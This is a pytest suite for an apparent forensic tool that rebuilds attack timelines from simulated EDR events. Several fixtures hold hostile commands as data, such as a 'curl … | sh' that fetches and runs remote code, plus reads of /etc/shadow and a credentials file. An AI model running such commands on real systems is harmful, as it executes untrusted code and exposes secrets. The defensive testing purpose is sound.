"""
Unit tests for GhostTrace Attack Timeline Reconstruction Engine.
Covers all Part D requirements:
1. Suspicious login followed by process and file activity.
2. Normal administrative login not treated as an attack (severity neutrality).
3. Outbound connection following file read (exfiltration restraint).
4. Missing or conflicting identifiers.
5. Shuffled event order timeline normalization.
6. Competing alternative hypotheses.
7. Valid source event ID reference on every major conclusion.
"""

import random
from datetime import datetime, timezone
import pytest

from investigation_engine.models import (
    EventType,
    EventSeverity,
    SecurityEvent,
)
from investigation_engine.reconstruction import reconstruct_attack_timeline


def make_test_event(
    event_id: str,
    timestamp_iso: str,
    event_type: EventType,
    severity: EventSeverity = EventSeverity.INFORMATIONAL,
    is_suspicious: bool = False,
    host_id: str | None = None,
    user_id: str | None = None,
    source_ip: str | None = None,
    session_id: str | None = None,
    process_id: int | None = None,
    command_line: str | None = None,
    file_path: str | None = None,
    destination_ip: str | None = None,
    destination_port: int | None = None,
    action: str | None = None,
) -> SecurityEvent:
    return SecurityEvent(
        event_id=event_id,
        timestamp=timestamp_iso,
        event_type=event_type,
        severity=severity,
        is_suspicious=is_suspicious,
        host_id=host_id,
        user_id=user_id,
        source_ip=source_ip,
        session_id=session_id,
        process_id=process_id,
        command_line=command_line,
        file_path=file_path,
        destination_ip=destination_ip,
        destination_port=destination_port,
        action=action,
        source="simulated_edr",
        original_event_data={"raw_id": event_id, "mock": True},
    )


class TestReconstructionEngine:
    def test_requirement_1_suspicious_login_followed_by_process_and_file(self):
        """
        Req 1: A successful suspicious login followed by related process and file activity
        must identify the candidate entry point, reconstruct phases, and link evidence.
        """
        e1 = make_test_event(
            "auth-spray-1", "2026-10-18T08:00:00Z", EventType.AUTHENTICATION,
            user_id="svc_app", source_ip="198.51.100.99", action="LOGON_FAILURE", is_suspicious=True
        )
        e2 = make_test_event(
            "auth-success-2", "2026-10-18T08:00:30Z", EventType.AUTHENTICATION,
            user_id="svc_app", source_ip="198.51.100.99", session_id="sess-infiltrate",
            action="LOGON_SUCCESS", is_suspicious=True, severity=EventSeverity.HIGH
        )
        e3 = make_test_event(
            "proc-bash-3", "2026-10-18T08:01:00Z", EventType.PROCESS_EXECUTION,
            user_id="svc_app", session_id="sess-infiltrate", process_id=3001,
            command_line="/bin/bash -c 'curl http://203.0.113.50/tool | sh'", is_suspicious=True
        )
        e4 = make_test_event(
            "file-access-4", "2026-10-18T08:02:00Z", EventType.FILE_AUDIT,
            user_id="svc_app", session_id="sess-infiltrate", process_id=3001,
            file_path="/var/sim_secrets/db_creds.env", is_suspicious=True
        )

        result = reconstruct_attack_timeline([e1, e2, e3, e4])

        # Verify entry point
        assert len(result.candidate_entry_points) >= 1
        entry = result.candidate_entry_points[0]
        assert entry.event_id == "auth-success-2"
        assert "auth-spray-1" in entry.supporting_event_ids
        assert entry.source_ip == "198.51.100.99"

        # Verify chronological timeline
        timeline_ids = [t.event_id for t in result.timeline]
        assert timeline_ids == ["auth-spray-1", "auth-success-2", "proc-bash-3", "file-access-4"]

        # Verify lifecycle phases
        phases = {t.event_id: t.phase for t in result.timeline}
        assert "Credential Access" in phases["auth-spray-1"] or "Initial Access" in phases["auth-spray-1"]
        assert "Initial Access" in phases["auth-success-2"]
        assert "Execution" in phases["proc-bash-3"]
        assert "Credential Access" in phases["file-access-4"]

    def test_requirement_2_normal_admin_login_not_automatically_attack(self):
        """
        Req 2: A normal administrative login (even with HIGH severity logging)
        must not automatically become an attack (Severity Neutrality).
        """
        # Event with severity HIGH (e.g. system alert rule for root session), but strictly benign
        e1 = make_test_event(
            "admin-login", "2026-10-18T09:00:00Z", EventType.AUTHENTICATION,
            severity=EventSeverity.HIGH, user_id="admin_sarah", host_id="corp-srv01",
            source_ip="10.0.1.5", action="LOGON_SUCCESS", is_suspicious=False
        )
        e2 = make_test_event(
            "admin-read-cfg", "2026-10-18T09:05:00Z", EventType.FILE_AUDIT,
            severity=EventSeverity.INFORMATIONAL, user_id="admin_sarah", host_id="corp-srv01",
            file_path="/etc/nginx/nginx.conf", is_suspicious=False
        )

        result = reconstruct_attack_timeline([e1, e2])

        # Candidate entry points must be empty for normal administration
        assert len(result.candidate_entry_points) == 0

        # Primary hypothesis must be normal business/administrative baseline
        primary_hypo = result.hypotheses[0]
        assert "Normal Business" in primary_hypo.title or "Routine" in primary_hypo.title
        assert primary_hypo.rank == 1
        assert primary_hypo.score > 0.8

    def test_requirement_3_outbound_connection_exfiltration_restraint(self):
        """
        Req 3: An outbound connection following file access must NEVER be claimed
        as proven exfiltration solely based on connection establishment.
        """
        e1 = make_test_event(
            "file-secret-read", "2026-10-18T14:00:00Z", EventType.FILE_AUDIT,
            process_id=9999, session_id="sess-exfil-test", file_path="/etc/shadow", is_suspicious=True
        )
        e2 = make_test_event(
            "net-outbound", "2026-10-18T14:00:30Z", EventType.NETWORK_CONNECTION,
            process_id=9999, session_id="sess-exfil-test", destination_ip="203.0.113.100",
            destination_port=4444, is_suspicious=True
        )

        result = reconstruct_attack_timeline([e1, e2])

        # Check inferred conclusions: must NOT claim data was exfiltrated
        exfil_conclusions = [
            c for c in result.inferred_conclusions
            if "exfiltration" in c.statement.lower() or "exfiltrated" in c.statement.lower()
        ]
        assert len(exfil_conclusions) >= 1
        conclusion_text = exfil_conclusions[0].statement
        assert "NOT proven" in conclusion_text or "unproven" in conclusion_text.lower()

        # Must record an unresolved question about missing payload evidence
        exfil_questions = [
            q for q in result.unresolved_questions
            if "exfiltrat" in q.question.lower() or "shadow" in q.question.lower()
        ]
        assert len(exfil_questions) >= 1
        assert "Missing" in exfil_questions[0].missing_evidence_type

    def test_requirement_4_missing_or_conflicting_identifiers(self):
        """
        Req 4: Handles missing identifiers (None host_id, user_id, session_id, PID)
        and contradictory evidence gracefully without throwing exceptions.
        """
        # Event with minimal fields
        e1 = make_test_event("evt-bare", "2026-10-18T10:00:00Z", EventType.AUTHENTICATION)
        # Event with conflicting session/host
        e2 = make_test_event(
            "evt-conflict", "2026-10-18T10:01:00Z", EventType.PROCESS_EXECUTION,
            host_id="host-alpha", process_id=50, session_id="sess-x"
        )
        e3 = make_test_event(
            "evt-conflict-2", "2026-10-18T10:02:00Z", EventType.PROCESS_EXECUTION,
            host_id="host-beta", process_id=50, session_id="sess-x"  # Same PID & session on different host
        )

        result = reconstruct_attack_timeline([e1, e2, e3])
        assert len(result.timeline) == 3
        # Ensure evidence graph still built
        assert len(result.evidence_graph.nodes) > 0

    def test_requirement_5_events_supplied_in_shuffled_order(self):
        """
        Req 5: Events supplied in shuffled/random order must be deterministically
        ordered chronologically in the output timeline.
        """
        timestamps = [
            "2026-10-18T01:00:00Z",
            "2026-10-18T02:00:00Z",
            "2026-10-18T03:00:00Z",
            "2026-10-18T04:00:00Z",
            "2026-10-18T05:00:00Z",
        ]
        events = [
            make_test_event(f"evt-{i}", ts, EventType.AUTHENTICATION)
            for i, ts in enumerate(timestamps)
        ]

        # Randomize input order
        shuffled = list(events)
        random.seed(42)
        random.shuffle(shuffled)
        assert [e.event_id for e in shuffled] != [e.event_id for e in events]

        result = reconstruct_attack_timeline(shuffled)
        output_ids = [t.event_id for t in result.timeline]
        assert output_ids == ["evt-0", "evt-1", "evt-2", "evt-3", "evt-4"]

    def test_requirement_6_competing_alternative_explanations(self):
        """
        Req 6: When suspicious activity is reconstructed, produces at least two
        competing ranked hypotheses with evidence quality rationale.
        """
        e1 = make_test_event(
            "spray", "2026-10-18T10:00:00Z", EventType.AUTHENTICATION,
            user_id="svc_deploy", source_ip="198.51.100.42", action="LOGON_FAILURE", is_suspicious=True
        )
        e2 = make_test_event(
            "login", "2026-10-18T10:01:00Z", EventType.AUTHENTICATION,
            user_id="svc_deploy", source_ip="198.51.100.42", session_id="s1", action="LOGON_SUCCESS", is_suspicious=True
        )
        e3 = make_test_event(
            "proc", "2026-10-18T10:02:00Z", EventType.PROCESS_EXECUTION,
            user_id="svc_deploy", session_id="s1", command_line="curl external | sh", is_suspicious=True
        )

        result = reconstruct_attack_timeline([e1, e2, e3])

        # Must have at least 2 hypotheses
        assert len(result.hypotheses) >= 2
        h1, h2 = result.hypotheses[0], result.hypotheses[1]

        # Verified ranking & scoring
        assert h1.rank == 1
        assert h2.rank == 2
        assert h1.score > h2.score

        # Must include explanations and supporting IDs
        assert len(h1.supporting_event_ids) > 0
        assert h1.confidence in ("HIGH", "MEDIUM", "LOW", "TENTATIVE")
        assert len(h1.confidence_explanation) > 0
        assert len(h2.confidence_explanation) > 0

    def test_requirement_7_every_major_conclusion_references_valid_source_event_ids(self):
        """
        Req 7: Every observed fact, candidate entry point, and inferred conclusion
        must reference valid source event IDs that exist in the input dataset.
        """
        e1 = make_test_event("id-1", "2026-10-18T12:00:00Z", EventType.AUTHENTICATION, is_suspicious=True, action="LOGON_SUCCESS", source_ip="198.51.100.5")
        e2 = make_test_event("id-2", "2026-10-18T12:01:00Z", EventType.PROCESS_EXECUTION, is_suspicious=True, command_line="bash -c base64")

        valid_ids = {"id-1", "id-2"}
        result = reconstruct_attack_timeline([e1, e2])

        # 1. Check Observed Facts
        for fact in result.observed_facts:
            assert len(fact.supporting_event_ids) > 0
            for eid in fact.supporting_event_ids:
                assert eid in valid_ids, f"Fact referenced non-existent event ID '{eid}'"

        # 2. Check Candidate Entry Points
        for ep in result.candidate_entry_points:
            assert len(ep.supporting_event_ids) > 0
            for eid in ep.supporting_event_ids:
                assert eid in valid_ids, f"Entry point referenced non-existent event ID '{eid}'"

        # 3. Check Inferred Conclusions
        for conc in result.inferred_conclusions:
            assert len(conc.supporting_event_ids) > 0
            for eid in conc.supporting_event_ids:
                assert eid in valid_ids, f"Conclusion referenced non-existent event ID '{eid}'"

        # 4. Check Hypotheses
        for hypo in result.hypotheses:
            for eid in hypo.supporting_event_ids:
                assert eid in valid_ids, f"Hypothesis referenced non-existent event ID '{eid}'"
